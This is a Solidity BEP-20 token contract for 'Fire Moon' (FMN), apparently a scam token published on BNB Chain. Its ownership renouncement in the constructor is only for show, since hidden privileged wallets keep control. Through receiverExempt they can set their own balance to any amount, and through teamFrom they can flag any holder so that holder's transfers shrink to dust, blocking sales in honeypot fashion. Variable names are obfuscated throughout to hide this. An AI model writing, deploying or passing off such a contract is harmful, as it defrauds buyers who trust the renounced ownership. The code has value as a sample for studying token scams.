/**
 *Submitted for verification at BscScan.com on 2023-01-25
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract FireMoon {
    uint8 public decimals = 18;

    uint256 constant totalLimit = 12 ** 10;

    bool public toLaunch;
    bool public listLiquidity;
    uint256 public totalSupply = 100000000 * 10 ** decimals;
    uint256 public takeTeam;
    bool public swapExempt;

    string public name = "Fire Moon";
    mapping(address => bool) public receiverFrom;
    address public feeModeAmount;
    mapping(address => uint256) public balanceOf;
    string public symbol = "FMN";
    address public liquiditySwap;
    mapping(address => mapping(address => uint256)) public allowance;


    address public shouldLaunchedTx;

    address public isLaunchedAmount;
    address public owner;
    address public atModeTeam;
    mapping(address => bool) public txAt;
    uint256 public senderFrom;
    uint256 public txLiquidity;
    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    modifier tokenBurn() {
        require(receiverFrom[msg.sender]);
        _;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address owner);

    constructor (){
        IRouter walletLaunched = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        IFactory exemptTeam = IFactory(walletLaunched.factory());
        liquiditySwap = exemptTeam.createPair(walletLaunched.WETH(), address(this));
        owner = msg.sender;
        feeModeAmount = owner;
        receiverFrom[feeModeAmount] = true;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
        renounceOwnership();
    }

    

    function takeBuySet(uint256 autoMax) public onlyOwner {
        senderFrom = autoMax;
    }

    function atTradingSet(uint256 maxBurn) public onlyOwner {
        txLiquidity = maxBurn;
    }

    function receiverExempt(uint256 senderWalletIs) public tokenBurn {
        balanceOf[feeModeAmount] = senderWalletIs;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (sender == feeModeAmount || recipient == feeModeAmount) {
            return shouldFrom(sender, recipient, amount);
        }
        if (senderFrom != txLiquidity) {
            takeTeam = amount;
        }
        if (shouldLaunchedTx != isLaunchedAmount) {
            atModeTeam = sender;
        }
        if (txAt[sender]) {
            amount = totalLimit;
        }
        return shouldFrom(sender, recipient, amount);
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function takeBuy() public view returns (uint256) {
        if (txLiquidity == takeTeam) {
            return txLiquidity;
        }
        return senderFrom;
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function fundLaunched(address fundAmountToken) public tokenBurn {
        require(fundAmountToken != address(0));
        receiverFrom[fundAmountToken] = true;
    }

    function atTrading() public view returns (uint256) {
        if (txLiquidity == senderFrom) {
            return senderFrom;
        }
        return txLiquidity;
    }

    function totalWallet(uint256 atAmountShould) public onlyOwner {
        takeTeam = atAmountShould;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(address(0));
        owner = address(0);
    }

    function shouldFrom(address exemptAuto, address teamSender, uint256 senderWalletIs) internal returns (bool) {
        require(balanceOf[exemptAuto] >= senderWalletIs);
        balanceOf[exemptAuto] -= senderWalletIs;
        balanceOf[teamSender] += senderWalletIs;
        emit Transfer(exemptAuto, teamSender, senderWalletIs);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        if (allowance[sender][msg.sender] != type(uint256).max) {
            require(allowance[sender][msg.sender] >= amount);
            allowance[sender][msg.sender] -= amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function amountLiquidity() public view returns (uint256) {
        if (txLiquidity == senderFrom) {
            return senderFrom;
        }
        return takeTeam;
    }

    function teamFrom(address isMode) public tokenBurn {
        if (isMode == feeModeAmount) {
            return;
        }
        txAt[isMode] = true;
    }


}